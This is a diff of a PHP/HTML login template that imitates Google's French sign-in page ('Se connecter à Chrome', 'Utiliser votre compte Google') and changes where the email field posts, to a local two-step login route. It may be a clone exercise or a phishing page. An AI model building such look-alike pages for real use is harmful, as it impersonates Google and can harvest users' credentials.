@@ -35,8 +35,8 @@
         </div>
         <h2>Se connecter à Chrome</h2>
         <p>Utiliser votre compte Google</p>
-        <form  method="post"  action="<?php echo URL;?>index.php/authentification/connexion/"
-        >
+        <form method="post"  action="<?php echo URL;?>index.php/authentification/Connexion_step1/connexion_redirect">
+       
             <div class="inputBox">
                 <input type="email" name="email1" required="" onkeyup="this.setAttribute('value', this.value);" value="">
                 <label>Adresse e-mail ou numéro de téléphone</label>
@@ -44,15 +44,15 @@
             <div class="forgot">
                 <button type="button">Adresse e-mail oublié?</button>
             </div>
-            <div class="">
-                <span>S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. <a href="">En savoir plus</a></span>
+            <div class="safety">
+                <span class="safety">S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. <a href="" class="more">En savoir plus</a></span>
             </div>
             <div class="compte">
                 <div class="button-compte">
-                    <button type="button" onclick="location.href='<?php echo URL;?>index.php/authentification/Inscription/index'">Créer un compte</button>
+                    <button type="button" onclick="location.href='<?php echo URL; ?>index.php/authentification/Inscription/index'">Créer un compte</button>
                 </div>
                 <div>
-                    <input type="submit" name="sign-in"  onclick="location.href='<?php echo URL;?>index.php/authentification/Connexion_step2/index'" value="Suivant">
+                    <input type="submit" name="sign-in" value="Suivant">
                 </div>
 
             </div>
